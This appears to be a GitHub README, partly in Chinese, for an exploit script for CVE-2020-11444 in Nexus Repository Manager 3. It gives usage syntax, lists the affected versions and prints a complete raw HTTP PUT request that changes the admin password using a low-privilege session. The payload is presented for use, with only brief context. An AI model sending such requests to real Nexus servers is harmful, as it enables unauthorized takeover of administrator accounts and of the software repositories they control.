# CVE-2020-11444
Nexus 3 越权漏洞利用脚本  
更多脚本文件另参：https://github.com/zhzyker/exphub

# Readme
```
+-----------------------------------------------------------------------------------------------+
+ DES: by zhzyker as https://github.com/zhzyker/exphub                                          +
+      CVE-2020-11444 Nexus 3 Unauthorized Vuln (change admin password                          +
+-----------------------------------------------------------------------------------------------+
+ USE: python3 <filename> <url> <session> <password>                                            +
+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a 123456 +
+ VER: Nexus Repository Manager 3.x OSS / Pro <= 3.21.1                                         +
+-----------------------------------------------------------------------------------------------+
```

# Examples
![images](https://github.com/zhzyker/CVE-2020-11444/blob/master/20200527_1.png)

# Payload 
```
PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1
Host: 127.0.0.1:8081
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6080434247960143
Content-Type: text/plain
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=af3706e2-dc9e-47fa-9739-edb6b3d512fe

exphub
```
